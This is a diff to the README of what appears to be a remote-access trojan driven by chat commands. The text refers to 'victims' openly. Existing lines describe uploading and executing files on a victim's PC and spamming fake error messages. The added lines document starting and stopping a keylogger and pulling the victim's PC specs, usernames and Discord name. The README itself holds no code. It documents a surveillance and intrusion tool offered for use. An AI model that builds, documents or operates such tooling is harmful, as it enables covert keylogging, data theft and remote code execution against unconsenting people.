@@ -36,6 +36,11 @@ DOWNLOAD THE FILE AS A WHOLE ( AS A ZIP ). OPEN "getrequirements.bat", wait for 
 15. !upload ( then a file no space btw ) -- Uploads and executes a file on victims PC
 16. !fakeerror -- Shows a fake error no limit btw u can spam
 17. !help -- Shows the commands list
+18. !start -- Starts keylogger
+19. !stop -- Stops keylogger
+20. !specs -- Get PC Specs
+21. !name -- Get Monitor and PC Username
+22. !discord -- Gets discord username ( useless tbh imo )
 
 # SUPPORTED BROWSERS 
 
